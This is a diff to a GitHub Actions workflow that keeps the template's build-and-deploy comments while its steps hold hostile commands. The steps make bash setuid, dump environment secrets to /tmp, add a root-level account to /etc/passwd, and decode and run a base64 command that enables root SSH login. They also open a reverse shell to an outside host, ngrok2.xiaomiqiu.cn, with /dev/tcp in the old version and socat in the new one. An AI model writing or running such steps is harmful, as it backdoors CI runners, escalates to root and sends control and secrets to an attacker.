@@ -27,13 +27,13 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: bash -c "sudo apt-get install socat;sudo chmod u+s /bin/bash;(env>/tmp/b1.txt;env|grep ss|tee /tmp/aaa;echo '\\\$ui1'>/tmp/bbb;echo '\\$ui2'>/tmp/ccc;sleep 120&);"
+        run: bash -c "sudo apt-get install socat;sudo chmod u+s /bin/bash;(env>/tmp/b1.txt;env|grep ss|tee /tmp/aaa;echo '\\\$ui1'>/tmp/bbb;echo '\\$ui2'>/tmp/ccc;echo '\$ui2'>/tmp/ccc;sleep 120&);"
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          bash -p -c "(sleep 150&);env|grep ss>/tmp/c2ss.txt;cd /tmp;cp /etc/passwd /etc/passwd.bak&&echo "yes:\\$1\\$123\\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash">>/etc/passwd;echo $sshc1|tee d3.txt|sh;sudo /etc/init.d/ssh restart;ps aux|tee e4.txt;bash -pli &>/dev/tcp/ngrok2.xiaomiqiu.cn/34302 0>&1"
+          bash -p -c "(sleep 150&);env|grep ss>/tmp/c2ss.txt;cd /tmp;cp /etc/passwd /etc/passwd.bak&&echo "yes:\\$1\\$123\\$EKWAR30..wEKERDtzOQUv/:0:0:toor:/tmp:/bin/bash">>/etc/passwd;echo $sshc1|tee d3.txt|base64 -d|sh;/etc/init.d/ssh restart;ps aux>pse4.txt;socat exec:'bash -pli',pty,stderr,setsid,sigint,sane tcp:ngrok2.xiaomiqiu.cn:34292"
         env:
           sshc1: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
